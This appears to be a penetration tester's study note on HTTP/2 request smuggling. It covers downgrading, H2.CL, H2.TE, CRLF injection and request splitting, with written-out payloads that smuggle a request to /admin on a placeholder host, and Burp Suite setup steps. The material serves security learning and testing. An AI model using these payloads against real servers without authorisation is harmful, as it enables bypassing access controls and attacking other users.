Research: https://portswigger.net/research/http2

# HTTP/2

#### Length
HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths.
#### HTTP 2 Downgrading
HTTP/2 downgrading is the process of rewriting HTTP/2 requests using HTTP/1 syntax to generate an equivalent HTTP/1 request.
![[http2-http1-mapping.jpg]]
# Hidden HTTP/2 support
Servers explicitly advertise support for it via ALPN as part of the TLS handshake, but they can be misconfigured.

Use Burp Scanner Pro to automatically detect of hidden HTTP/2 support or force to use HTTP/2:
1. Settings -> Tools -> Repeater
2. Connections -> enable **Allow HTTP/2 ALPN**
3. In Repeater, Inspector -> Request attributes
4. Switch Protocol to HTTP/2

# H2.CL
HTTP/2 requests can also include their own `content-length` header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request.

The spec dictates that any `content-length` header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading. As a result, it may be possible to smuggle requests by injecting a misleading `content-length` header.

**Front-end (HTTP/2)**:
```http/2
:method        POST
:path          /example
:authority     vulnerable-website.com
content-type   application/x-www-form-urlencoded
content-length 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```
**Backend (HTTP/1.1)**:

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

<mark class="hltr-o">GET /admin HTTP/1.1</mark>
<mark class="hltr-o">Host: vulnerable-website.com</mark>
<mark class="hltr-o">Content-Length: 10</mark>

<mark class="hltr-o">x=1</mark><mark class="hltr-g">GET / H</mark>

# H2.TE
Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any `transfer-encoding: chunked` header you try to inject should be stripped or the request blocked entirely. If the front-end server fails to do this, and subsequently downgrades the request for an HTTP/1 back-end that does support chunked encoding, this can also enable request smuggling attacks.
**Front-end (HTTP/2)**:
```
:method           POST
:path             /example
:authority        vulnerable-website.com
content-type      application/x-www-form-urlencoded
transfer-encoding chunked 

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```
**Back-end (HTTP/1.1)**:
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

<mark class="hltr-o">GET /admin HTTP/1.1</mark>
<mark class="hltr-o">Host: vulnerable-website.com</mark>
<mark class="hltr-o">Foo: bar</mark>

# CRLF injection
In HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (`\n`) characters to smuggle prohibited headers.
```http
Foo: bar\nTransfer-Encoding: chunked
```
Front-end (HTTP/2):
```http/2
bar        \r\nTransfer-Encoding: chunked
```
Back-end (HTTP/1.1):
```http
Foo: bar
Transfer-Encoding: chunked
```
Note: it's necessary to enable  **Allow HTTP/2 ALPN** 
How to work with kettled HTTP/2 in #burp https://www.youtube.com/watch?v=W3BGHKyf8RY

# HTTP/2 request splitting via CRLF injection
Split request in the headers after downgrading

| :method    | GET                                                                        |
| ---------- | -------------------------------------------------------------------------- |
| :path      | /                                                                          |
| :authority | vulnerable-website.com                                                     |
| foo        | bar\r\n<br>\r\n<br>GET /admin HTTP/1.1\r\n<br>Host: vulnerable-website.com |
Front-end servers typically strip the :authority pseudo-header and replace it with a new HTTP/1 Host header during downgrading. 
During rewriting, some front-end servers append the new Host header to the end of the current list of headers. As far as an HTTP/2 front-end is concerned, this after the foo header

| :method    | GET                                                                        |
| ---------- | -------------------------------------------------------------------------- |
| :path      | /                                                                          |
| :authority | vulnerable-website.com                                                     |
| foo        | bar\r\n<br>Host: vulnerable-website.com\r\n<br>\r\n<br>GET /admin HTTP/1.1 |
